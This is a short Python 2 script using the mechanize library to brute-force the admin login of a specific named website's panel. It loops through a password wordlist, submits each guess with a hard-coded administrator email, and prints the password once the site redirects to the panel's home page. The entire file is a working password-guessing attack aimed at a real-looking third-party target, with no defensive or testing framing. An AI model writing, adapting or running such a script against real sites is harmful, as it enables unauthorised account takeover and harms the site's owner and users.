import mechanize 
b = mechanize.Browser()

url = "http://destanlibombe.com/panel/index.php"
wordlist = "wordlist.txt"

try:
          wordlist = open(wordlist, "r")
except: 
          print "\nWordlist Not Found!"
          quit()

for password in wordlist:
            response = b.open(url)
            b.select_form(nr=0)

            b.form['mail'] = 'admin@destanlibombe.com'
            b.form['pass'] = password.strip()
            b.method = "post"
            response = b.submit()

            if response.geturl() == "http://destanlibombe.com/panel/anasayfa.php":
                  print "Password Found! : " + password.strip()
                  break          